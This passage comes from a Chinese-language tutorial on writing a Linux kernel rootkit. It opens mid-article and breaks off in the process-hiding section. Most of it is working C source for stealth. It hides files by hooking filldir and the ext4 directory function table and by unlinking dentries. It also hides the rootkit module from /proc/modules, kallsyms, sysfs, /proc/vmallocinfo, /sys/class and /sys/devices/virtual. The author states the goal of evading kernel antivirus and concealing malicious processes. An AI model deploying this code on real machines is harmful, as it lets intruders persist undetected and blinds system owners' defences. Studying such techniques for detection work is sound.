由此我们有两种隐藏文件的方法：

  * **直接劫持** `filldir&filldir64&compat_filldir` **函数，在遇到我们要隐藏的文件时直接返回** ，从而完成文件隐藏的功能
  * 由于 `iterate_dir()` 的参数之一便是 `ctx` ，因此我们也可以劫持 `iterate_dir()` 后修改 `ctx->actor`

> 需要注意的是这些函数对内核模块并不导出，因此我们需要通过用户态进程辅助读取 `/proc/kallsyms` 来获得其地址

hook 函数的模板在前面已经给出，这里不再赘叙，我们只需要判断是否为我们要隐藏的文件，如果是则直接返回即可，现笔者给出如下示例代码：

    
    
    struct hook_info filldir_hook_info,filldir64_hook_info,compat_filldir_hook_info;
    filldir_t filldir, filldir64, compat_filldir;
    
    struct hide_file_info {
        struct list_head list;
        char *file_name;
    };
    
    struct list_head hide_file_list;
    
    /* 一共要 hook 三个函数，因此还有另外两个和这个函数一模一样的函数，就不重复 copy 代码了：） */
    size_t a3_rootkit_evil_filldir(size_t arg0, size_t arg1, size_t arg2, 
                                   size_t arg3, size_t arg4, size_t arg5)
    {
        struct hide_file_info *info = NULL;
        size_t args[6], ret;
    
        args[0] = arg0;
        args[1] = arg1;
        args[2] = arg2;
        args[3] = arg3;
        args[4] = arg4;
        args[5] = arg5;
    
        /* patch and call the original function */
        a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
                                                  filldir_hook_info.orig_data, 
                                                  HOOK_BUF_SZ);
    
        /* check for whether the file to be hide is in result and delete them */
        list_for_each_entry(info, &hide_file_list, list) {
            if (!strncmp(info->file_name, args[1], args[2])) {
                ret = 1; /* it should be true, otherwise the iterate will stop */
                goto hide_out;
            }
        }
    
        /* normally fill */
        ret = filldir_hook_info.orig_func(args[0], args[1], args[2], 
                                          args[3], args[4], args[5]);
    
    hide_out:
        /* re-patch the hook point again */
        a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
                                                  filldir_hook_info.hook_data, 
                                                  HOOK_BUF_SZ);
    
        return ret;
    }
    
    //...
    
    /* 你需要在模块初始化函数中调用该函数 */
    void a3_rootkit_hide_file_subsystem_init(void)
    {
        INIT_LIST_HEAD(&hide_file_list);
        a3_rootkit_text_hook(filldir, a3_rootkit_evil_filldir, 
                             &filldir_hook_info);
        a3_rootkit_text_hook(filldir64, a3_rootkit_evil_filldir64, 
                             &filldir64_hook_info);
        a3_rootkit_text_hook(compat_filldir, a3_rootkit_evil_compat_filldir, 
                             &compat_filldir_hook_info);
    }
    
    /* 这个函数用来添加新的隐藏文件：） */
    void a3_rootkit_add_new_hide_file(const char *file_name)
    {
        struct hide_file_info *info;
    
        info = kmalloc(sizeof(*info), GFP_KERNEL);
        info->file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);
        strcpy(info->file_name, file_name);
    
        list_add(&info->list, &hide_file_list);
    }
    

成功在不改变文件可用性的情况下完成文件隐藏功能：

![](./img/1147309479896569059.png)

> 如果你同时想让大家没办法打开该文件以达成更完美的文件隐藏，那么还可以额外 hook 几个 `open` 系统调用的核心，这里笔者就不给示例代码了：）

## 二、劫持对应文件系统的 VFS 函数表

前面我们讲到用以遍历文件的系统调用都会调用到 `iterate_dir()` 函数，而 `iterate_dir()` 中实际上会调用对应文件的函数表中的
`iterate_shared` / `iterate` 函数，由此我们也可以 **通过 hook 对应文件系统函数表的**
`iterate_shared` / `iterate` **函数来实现文件隐藏的功能**

> 同一文件系统间共用相同的函数表，由此对函数表的修改直接对整个文件系统生效，不过这里我们需要注意区分的是 **数据文件和文件夹使用的不是同一个函数表**

由于填充返回给用户的数据的核心逻辑便是调用 `ctx->actor()` ，因此我们可以在我们自定义的 `iterate_shared` /
`iterate` 中 **直接动态修改 ctx- >actor 函数指针**，从而完成文件隐藏：）

相比于 inline hook，直接 hook VFS 函数表要更方便得多，不过需要注意的是 **函数表的地址对内核模块同样是不导出的**
，这里我们有两种办法获得 VFS 函数表的地址：

  * 借助用户态进程读取 /proc/kallsyms 进行获取
  * 在内核空间中打开一个文件夹，直接修改其函数表

下面笔者给出以劫持 ext4 文件系统函数表为例的示例代码：

    
    
    struct hook_info filldir_hook_info,filldir64_hook_info,compat_filldir_hook_info;
    filldir_t filldir, filldir64, compat_filldir;
    struct file_operations *ext4_dir_operations;
    
    struct hide_file_info {
        struct list_head list;
        char *file_name;
    };
    
    struct list_head hide_file_list;
    
    int a3_rootkit_check_file_to_hide(const char *filename, int namlen)
    {
        struct hide_file_info *info = NULL;
    
        /* check for whether the file to be hide is in result and delete them */
        list_for_each_entry(info, &hide_file_list, list) {
            if (!strncmp(info->file_name, filename, namlen)) {
                return 1;
            }
        }
    
        return 0;
    }
    
    static int a3_rootkit_fake_filldir(struct dir_context *ctx, const char *name,
                                       int namlen, loff_t offset, u64 ino, 
                                       unsigned int d_type)
    {
        if (a3_rootkit_check_file_to_hide(name, namlen)) {
            return 1;
        }
    
        return filldir(ctx, name, namlen, offset, ino, d_type);
    }
    
    static int a3_rootkit_fake_filldir64(struct dir_context *ctx, const char *name,
                                         int namlen, loff_t offset, u64 ino, 
                                         unsigned int d_type)
    {
        if (a3_rootkit_check_file_to_hide(name, namlen)) {
            return 1;
        }
    
        return filldir64(ctx, name, namlen, offset, ino, d_type);
    }
    
    static int a3_rootkit_fake_compat_filldir(struct dir_context *ctx, const char *name,
                                              int namlen, loff_t offset, u64 ino, 
                                              unsigned int d_type)
    {
        if (a3_rootkit_check_file_to_hide(name, namlen)) {
            return 1;
        }
    
        return compat_filldir(ctx, name, namlen, offset, ino, d_type);
    }
    
    int (*orig_ext4_iterate_shared) (struct file *, struct dir_context *);
    
    static int a3_rootkit_fake_ext4_iterate_shared(struct file *file, 
                                                   struct dir_context *ctx)
    {
        if (ctx->actor == filldir) {
            ctx->actor = (void*) a3_rootkit_fake_filldir;
        } else if (ctx->actor == filldir64) {
            ctx->actor = (void*) a3_rootkit_fake_filldir64;
        } else if (ctx->actor == compat_filldir) {
            ctx->actor = (void*) a3_rootkit_fake_compat_filldir;
        } else {
            panic("Unexpected ctx->actor!");
        }
    
        return orig_ext4_iterate_shared(file, ctx);
    }
    
    /* 你需要在模块初始化函数中调用该函数 */
    void a3_rootkit_vfs_hide_file_subsystem_init(void)
    {
        struct file *file;
    
        INIT_LIST_HEAD(&hide_file_list);
    
        a3_rootkit_disable_write_protect();
    
        file = filp_open("/", O_RDONLY, 0);
        if (IS_ERR(file)) {
            goto out;
        }
    
        ext4_dir_operations = file->f_op;
        printk(KERN_ERR "Got addr of ext4_dir_operations: %lx",ext4_dir_operations);
        orig_ext4_iterate_shared = ext4_dir_operations->iterate_shared;
        ext4_dir_operations->iterate_shared = a3_rootkit_fake_ext4_iterate_shared;
    
        filp_close(file, NULL);
    
    out:
        a3_rootkit_enable_write_protect();
    }
    
    /* 这个函数用来添加新的隐藏文件：） */
    void a3_rootkit_add_new_hide_file(const char *file_name)
    {
        struct hide_file_info *info;
    
        info = kmalloc(sizeof(*info), GFP_KERNEL);
        info->file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);
        strcpy(info->file_name, file_name);
    
        list_add(&info->list, &hide_file_list);
    }
    

成功在不改变文件可用性的情况下完成文件隐藏功能：

![](./img/5783343484879781390.png)

## 三、篡改 VFS 结构（针对仅存在于内存中的文件系统）

在 Linux 当中诸如 `ramfs/tmpfs/devtmpfs/procfs/sysfs/...`
等文件系统都并不在外存当中占用存储空间，没有对应的文件系统设备，而 **仅存在于内存当中，为基于 VFS 与 page caches
结构形成基于内存的文件系统**

这类文件系统的文件函数表通常都是 `simple_dir_operations`，对于文件遍历而言其所用函数为 `dcache_readdir()`：

    
    
    const struct file_operations simple_dir_operations = {
        .open       = dcache_dir_open,
        .release    = dcache_dir_close,
        .llseek     = dcache_dir_lseek,
        .read       = generic_read_dir,
        .iterate_shared = dcache_readdir,
        .fsync      = noop_fsync,
    };
    EXPORT_SYMBOL(simple_dir_operations);
    

在 VFS 当中目录项（文件/文件夹）以 `dentry` 结构表示，其形成如下图所示拓扑结构，该函数的核心逻辑是 **遍历 dentry->d_child 链表**：

![](./img/8006265266755337125.png)

但是 **打开文件使用的是不同的逻辑** ，由此我们不难想到的是我们可以将要隐藏的文件的 `dentry` 结构体从对应的 `d_child` 链表中脱链，
**从而在保持文件可用性的情况下完成文件隐藏**

现笔者给出如下示例代码：

    
    
    static void a3_rootkit_ramfs_hide_file(const char * filename)
    {
        struct file * file;
        struct dentry * dentry;
    
        file = filp_open(filename, O_RDONLY, 0);
        if (IS_ERR(file)) {
            printk("[a3_rootkit:] Failed to open file %s!", filename);
        } else {
            dentry = file->f_path.dentry;
    
            dentry->d_child.next->prev = dentry->d_child.prev;
            dentry->d_child.prev->next = dentry->d_child.next;
    
            filp_close(file, NULL);
        }
    }
    

成功完成在基于内存的文件系统中的文件隐藏：

![](./img/5149424816816182960.png)

# 0x04. 模块隐藏

rootkit 想要在一台计算机上安稳地生存下来，便需要 _“隐藏自己，做好清理”_ ，本节将讲述如何将一个 LKM 进行初步的隐藏

> 实际上本章的大部分都可以通过常规的文件隐藏的方式来隐藏（这也是上古 rootkit 常用的做法），但是由于未修改内核数据结构的缘故使得这种方法
> **无法逃脱内核层面的反病毒查杀手段** ，因此这里我们采用更加深入底层的修改方法 ：）

## 一、模块符号 & /proc/modules 隐藏

当我们的模块被装载进内核之后，其导出符号会变成内核公用符号表的一部分， **可以直接通过 /proc/kallsyms 进行查看** ：

![](./img/9150116094717614327.png)

同时我们可以通过 `/proc/modules` 查看到我们的 rootkit：

![](./img/1637199647628248833.png)

因此我们需要对这两处地方进行隐藏，而这都需要基于同一个数据结构来完成：）

内核模块在内核当中被表示为一个 `module` 结构体，当我们使用 `insmod` 加载一个 LKM 时，实际上会调用到 `init_module()`
系统调用创建一个 `module` 结构体：

    
    
    struct module {
        enum module_state state;
    
        /* Member of list of modules */
        struct list_head list;
        //...
    

多个 `module` 结构体之间组成一个双向链表，链表头部定义于 `kernel/module/main.c` 中：

    
    
    LIST_HEAD(modules);
    

当我们使用 `lsmod` 显示已经装载的内核模块时，实际上会读取 `/proc/modules` 文件，而这 **实际是通过注册了序列文件接口对
modules 链表进行遍历完成的** ，同时 **这套逻辑也被应用于 /proc/kallsyms** 上：

    
    
    /* Called by the /proc file system to return a list of modules. */
    static void *m_start(struct seq_file *m, loff_t *pos)
    {
        mutex_lock(&module_mutex);
        return seq_list_start(&modules, *pos);
    }
    
    static void *m_next(struct seq_file *m, void *p, loff_t *pos)
    {
        return seq_list_next(p, &modules, pos);
    }
    
    static void m_stop(struct seq_file *m, void *p)
    {
        mutex_unlock(&module_mutex);
    }
    
    // m_show 就是获取模块信息，没啥好看的：）
    
    static const struct seq_operations modules_op = {
        .start  = m_start,
        .next   = m_next,
        .stop   = m_stop,
        .show   = m_show
    };
    
    /*
     * This also sets the "private" pointer to non-NULL if the
     * kernel pointers should be hidden (so you can just test
     * "m->private" to see if you should keep the values private).
     *
     * We use the same logic as for /proc/kallsyms.
     */
    static int modules_open(struct inode *inode, struct file *file)
    {
        int err = seq_open(file, &modules_op);
    
        if (!err) {
            struct seq_file *m = file->private_data;
    
            m->private = kallsyms_show_value(file->f_cred) ? NULL : (void *)8ul;
        }
    
        return err;
    }
    
    static const struct proc_ops modules_proc_ops = {
        .proc_flags = PROC_ENTRY_PERMANENT,
        .proc_open  = modules_open,
        .proc_read  = seq_read,
        .proc_lseek = seq_lseek,
        .proc_release   = seq_release,
    };
    
    static int __init proc_modules_init(void)
    {
        proc_create("modules", 0, NULL, &modules_proc_ops);
        return 0;
    }
    module_init(proc_modules_init);
    

因此我们不难想到的是 **我们可以通过将 rootkit 模块的 module 结构体从双向链表上脱链的方式完成模块隐藏** ，我们可以通过
`THIS_MODULE` 宏获取对当前模块的 `module` 结构体的引用，从而有代码如下：

> 较新版本的内核 `module_mutex` 符号好像不导出了，不过一般来说也不会在这种地方发生条件竞争，所以这里直接无锁脱链：）
    
    
    void a3_rootkit_hide_module_procfs(void)
    {
        struct list_head *list;
    
        list = &(THIS_MODULE->list);
        list->prev->next = list->next;
        list->next->prev = list->prev;
    }
    

简单测试一下，成功完成在 `/proc/modules` 与 `/proc/kallsyms` 中的隐藏：

![](./img/1803742463828117014.png)

## 二、/sys/module 隐藏

sysfs 是一个基于 ramfs 的文件系统，其作用是将内核的一些相关信息以文件的形式暴露给用户空间， **其中便包括内核模块的相关信息**
，因此我们还需要完成 rootkit 在 sysfs 中的隐藏

Linux 设备驱动模型中比较核心的组成部分便是 `kobject` 与 `kset`，`kobject` 表示一个内核对象，通常
**被嵌入到其他类型的结构当中** ，多个 `kobject` 之间组织成层次结构：

    
    
    struct kobject {
        const char      *name;
        struct list_head    entry;
        struct kobject      *parent;
        struct kset     *kset;
        //...
    

`kset` 是一种特殊的 kobject，表示 **属于一个特定子系统的一组特定类型的 kobject** ，用以整合一类 `kobject`：

    
    
    struct kset {
        struct list_head list;
        spinlock_t list_lock;
        struct kobject kobj;
        const struct kset_uevent_ops *uevent_ops;
    } __randomize_layout;
    

`kset` 与 `kobject` 间形成如下图所示层次结构， _属于同一 kset 的 kobject 可以有着不同的 ktype_ ：

![](./img/5664678038607368315.png)

这个模型更深入的实现不是我们所要关注的，我们更关注于如何在 sysfs 中隐藏我们的内核模块：）阅读源码不难发现各个内核模块的 `module`
结构体当中同样内嵌一个 kobject 结构体：

    
    
    struct module_kobject {
        struct kobject kobj;
        //...
    } __randomize_layout;
    
    struct module {
    
        //...
    
        /* Sysfs stuff. */
        struct module_kobject mkobj;
    
        //...
    

`module` 结构体实际上也通过 kobject 组织为层次结构，归属于 `module_kset`：

    
    
    struct kset *module_kset;
    

> 当我们 insmod 时会通过如下调用链将一个 module 结构体链入 sysfs 对应的 kobject 层次结构中，并创建相应的
> `/sys/module/[模块名]` 目录：
>  
>  
>     sys_init_module()
>     load_module()
>       mod_sysfs_setup()
>           mod_sysfs_init() // 会检查重名模块
>               kobject_init_and_add()
>                   kobject_add_varg()
>                           kobject_add_internal()
>  

当我们读取 `/sys/module` 目录时内核会根据 `module_kset` 的层次结构动态生成各个模块的文件夹，因此我们需要将我们的模块从
`module_kset` 的层次结构中脱离，从而完成 sysfs 下的隐藏，这里我们可以直接使用内核提供的 `kobject_del()` 函数完成
kobject 的摘除：

    
    
    void a3_rootkit_hide_module_sysfs(void)
    {
        kobject_del(&(THIS_MODULE->mkobj.kobj));
    }
    

现在我们将这两个函数都封装起来，加入到模块初始化函数中：

    
    
    void a3_rootkit_hide_module(void)
    {
        a3_rootkit_hide_module_procfs();
        a3_rootkit_hide_module_sysfs();
    }
    
    static int __init a3_rootkit_init(void)
    {
        //...
    
        a3_rootkit_hide_module();
    

重新打包，测试，可以看到在 `/sysf/module` 当中无法再看到我们的 rootkit ：）

![](./img/183431829872956964.png)

## 三、/dev 设备文件隐藏

设备文件是我们的 rootkit 暴露给用户空间的功能接口，为了保证 rootkit 的隐蔽性，因此我们也需要完成对该文件的隐藏

由于设备文件也是文件，同时 devtmpfs
是基于内存的文件系统，由此我们可以直接用前文【文件隐藏】一节中三种方法的任意一种完成对该文件的隐藏，这里就不给出示例代码了：）

![](./img/9222198473351957172.png)

## 四、/proc/vmallocinfo 隐藏

内核模块的内存是通过 `vmap` 机制进行动态分配的，该机制用以分配 **一块虚拟地址连续的内存**
（物理地址不一定连续），主要原理是在[对应的虚拟地址空间](https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst)中找到足够大的一块空闲区域，之后建立虚拟地址到物理页面的映射，对于内核模块而言为
`ffffffffa0000000~fffffffffeffffff` ：

    
    
    ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
    

在内核当中所有 **非连续映射的内核虚拟空间都有着一个对应的** `vmap_area` **结构体进行表示** ，其中 `vmap_area`
结构在内核当中同时以 **红黑树** （负责根据虚拟地址进行快速索引）与 **链表** 进行组织：

![](./img/4620334880684479071.png)

而通过读取 `/proc/vmallocinfo` 文件我们可以获取 **所有通过 vmap 机制分配的内存信息，其中便包括我们的 rootkit
所占用的内存** ：

![](./img/5417724702857247909.png)

因此我们还需要 **深入完成内存映射结构的隐藏**

首先还是按惯例阅读 `/proc/vmallocinfo` 的实现，类似于 `/proc/modules`，其同样使用了序列文件接口：

    
    
    static const struct seq_operations vmalloc_op = {
        .start = s_start,
        .next = s_next,
        .stop = s_stop,
        .show = s_show,
    };
    
    static int __init proc_vmalloc_init(void)
    {
        if (IS_ENABLED(CONFIG_NUMA))
            proc_create_seq_private("vmallocinfo", 0400, NULL,
                    &vmalloc_op,
                    nr_node_ids * sizeof(unsigned int), NULL);
        else
            proc_create_seq("vmallocinfo", 0400, NULL, &vmalloc_op);
        return 0;
    }
    module_init(proc_vmalloc_init);
    

注意到其 **实际上是通过 vmap_area_list 完成遍历的** ，因此我们只需要将模块内存对应的 `vmap_area` 从全局链表中摘除即可：

    
    
    static void *s_next(struct seq_file *m, void *p, loff_t *pos)
    {
        return seq_list_next(p, &vmap_area_list, pos);
    }
    
    //...
    
    static int s_show(struct seq_file *m, void *p)
    {
        struct vmap_area *va;
        struct vm_struct *v;
    
        va = list_entry(p, struct vmap_area, list);
        //...
    

下面笔者给出如下示例代码：

    
    
    #include <linux/rbtree.h>
    #include <linux/vmalloc.h>
    
    /* You should get it from /proc/kallsyms */
    struct rb_root *vmap_area_root;
    struct list_head *_vmap_area_list;
    
    void a3_rootkit_hide_module_meminfo(void)
    {
        struct vmap_area *va, *tmp_va;
        unsigned long mo_addr;
    
        mo_addr = (unsigned long) THIS_MODULE;
    
        list_for_each_entry_safe(va, tmp_va, _vmap_area_list, list) {
            if (mo_addr > va->va_start && mo_addr < va->va_end) {
                list_del(&va->list);
                //rb_erase(&va->rb_node, vmap_area_root);
            }
        }
    }
    

成功完成在 `/proc/vmallocinfo` 中的隐藏：

![](./img/8508244239332744938.png)

需要注意的是 **我们尽量不要摘除全局红黑树中的 vmap_area 节点** ， 因为这种方法意味着 **放弃了对相应虚拟地址空间的所有权，**
从而导致我们的 rootkit 的虚拟地址空间 **可能被后面加载的新模块所覆盖** ，使得我们的 rootkit 无法正常工作：(

> 不过这也使得反病毒软件可以通过比对 `vmap_area_list` 链表与 `vmap_area_root` 树找到我们要隐藏的内存区域，因此
> **我们实际上还是需要从红黑树中完成摘除**
>

>> 笔者将在后文通过虚拟地址空间迁移的方式完成比较完美的模块内存空间隐藏：）

## 五、/sys/class 隐藏

> 如果你的 rootkit 使用 procfs 提供用户态接口，则可以直接跳过这一节：）

我们在创建 `/dev/` 设备文件接口时创建了一个 class，而这可以被在 `/sys/class` 目录下发现，因此我们还需要完成对 class
的隐藏工作：

![](./img/8596797856071650526.png)

这里我们直接手动模拟 `class_destroy()` 的过程即可，下面笔者给出如下示例代码：

    
    
    void a3_rootkit_hide_module_class(void)
    {
        /**
         * `p` of `struct class` is `struct subsys_private*`, 
         * whose definition is not exported to LKM developer like us.
         * Luckily the kset we want is at the beginning of `struct subsys_private`, 
         * so we can just make a type conversion directly.
         */
        sysfs_remove_groups(&(((struct kset*)module_class->p)->kobj), 
                            module_class->class_groups);
        /**
         * we don't use kset_unregister() there because it'll also call the
         * kobject_put(), which dec the refcount of kobj, lead to the call of
         * class_release() and our `struct class` will be freed.
         */
        kobject_del(&(((struct kset*)module_class->p)->kobj));
    }
    

成功完成 `/sys/class` 目录下的隐藏：

![](./img/5817894696143593645.png)

## 六、/sys/device/virtual 隐藏

> 如果你的 rootkit 使用 procfs 提供用户态接口，则可以直接跳过这一节：）

我们在创建设备时并没有指定父设备，而[所有没有父类的设备类在 /sys/devices/virtual
下都有一席之地](https://lwn.net/Articles/646617/)，这使得我们的 rootkit
还是会被发现，因此我们还需要完成该目录下的隐藏工作：

![](./img/568068188156651389.png)

我们首先看看这个文件夹是怎么生成的，当我们调用 `device_create()` 创建设备时，存在如下调用链：

    
    
    device_create()
        device_create_groups_vargs()
            device_add()
                get_device_parent()
                    virtual_device_parent(); // parent==NULL
                    class_dir_create_and_add(); // parent==NULL

`virtual_device_parent()` 的作用其实就是获取 `/sys/devices/virtual` 对应的 kobject：

    
    
    struct kobject *virtual_device_parent(struct device *dev)
    {
        static struct kobject *virtual_dir = NULL;
    
        if (!virtual_dir)
            virtual_dir = kobject_create_and_add("virtual",
                                 &devices_kset->kobj);
    
        return virtual_dir;
    }
    

而 `class_dir_create_and_add()` 会创建一个新的 `class_dir` ，添加到前面获得的
`/sys/devices/virtual` 对应的 kobject （参数中的 `parent_kobj`）上：

    
    
    static struct kobject *
    class_dir_create_and_add(struct class *class, struct kobject *parent_kobj)
    {
        struct class_dir *dir;
        int retval;
    
        dir = kzalloc(sizeof(*dir), GFP_KERNEL);
        if (!dir)
            return ERR_PTR(-ENOMEM);
    
        dir->class = class;
        kobject_init(&dir->kobj, &class_dir_ktype);
    
        dir->kobj.kset = &class->p->glue_dirs;
    
        retval = kobject_add(&dir->kobj, parent_kobj, "%s", class->name);
        if (retval < 0) {
            kobject_put(&dir->kobj);
            return ERR_PTR(retval);
        }
        return &dir->kobj;
    }
    

`get_device_parent()` 会将新建的 `class_dir` 作为 kobject 返回给 `device_add()` ，之后其会被赋给
`dev->kobj.parent` ：

    
    
    static struct kobject *get_device_parent(struct device *dev,
                         struct device *parent)
    {
        if (dev->class) {
            //...
            k = class_dir_create_and_add(dev->class, parent_kobj);
            /* do not emit an uevent for this simple "glue" directory */
            mutex_unlock(&gdp_mutex);
            return k;
        }
        //...
    }
    
    //...
    
    int device_add(struct device *dev)
    {
        //...
        kobj = get_device_parent(dev, parent);
        if (IS_ERR(kobj)) {
            error = PTR_ERR(kobj);
            goto parent_error;
        }
        if (kobj)
            dev->kobj.parent = kobj;
        //...
    

由此我们可以直接通过将 `dev->kobj.parent` 脱链的方式完成隐藏，下面笔者给出如下示例代码：

    
    
    void a3_rootkit_hide_module_sys_device_virtual(void)
    {
        kobject_del(module_device->kobj.parent);
    }
    

成功完成 `/sys/devices/virtual` 下的隐藏：

![](./img/5616229313297455798.png)

## Extra、模块依赖关系隐藏

如果我们的 rootkit 依赖于其他的模块，则模块间依赖关系会被记录于 `sys/module/依赖模块/holder/`
中，因此我们也需要完成对模块依赖关系的隐藏

模块间依赖关系通过 `module_use` 结构体进行记录，本质上还是通过链表构建依赖关系：

    
    
    /* modules using other modules: kdb wants to see this. */
    struct module_use {
        struct list_head source_list;
        struct list_head target_list;
        struct module *source, *target;
    };
    

因此我们只需要完成对应链表的脱链工作即可，下面笔者给出如下示例代码：

    
    
    void a3_rootkit_hide_module_dependency(void)
    {
        struct module_use *use, *tmp;
    
        list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
            list_del(&use->source_list);
            list_del(&use->target_list);
            sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        }
    }
    

# 0x05. 进程隐藏

有的时候我们需要启动一些恶意进程帮助我们完成一些任务，但是这些恶意进程很容易一个 `ls` 就被发现了 :（ 所以我们还需要完成隐藏进程的工作

## 一、pid 隐藏

进程 id 在内核当中并非一个简单的整型字面量，而是一个 `pid` 结构体：

    
    
    struct pid
    {
        refcount_t count;
        unsigned int level;
        spinlock_t lock;
        /* lists of tasks that use this pid */
        struct hlist_head tasks[PIDTYPE_MAX];
        struct hlist_head inodes;
        /* wait queue for pidfd notifications */
        wait_queue_head_t wait_pidfd;
        struct rcu_head rcu;
        struct upid numbers[1];
    };
    

> `inodes` 域似乎暂时没用：）

虽然所有的 `task_struct` 形成一个双向链表，但是遍历链表以找寻 pid 对应的 PCB 效率过低，因而有了基于 `pid`
结构体的索引，我们可以通过该结构体直接找到一个 pid 对应的 PCB，同时不同类型的进程（属于同一进程组/属于同一会话）也会通过
`task_struct->pid_links` 进行连接：

![](./img/6577912263693639281.png)

一个进程在不同的 pid 命名空间内可能有着不同的 pid（其中子命名空间对父命名空间完全可见），内核通过 `upid` 结构体存储一个 `pid`
结构体在相应命名空间中的值，根据命名空间的父子层次结构存储在 `pid` 结构体中动态分配的 `upid` 数组中：

![](./img/1690420036235955458.png)

为了提高查找速度 ，`pid` 在内核中被组织成 **基数树** （radix trie，对应 `idr` 结构体），当进行 `pid`
结构体查找时（`find_vpid()` ）实际上会先获取到当前进程的 pid 命名空间（`struct pid_namespace`）再进行基数树搜索

> 没有图，因为基数

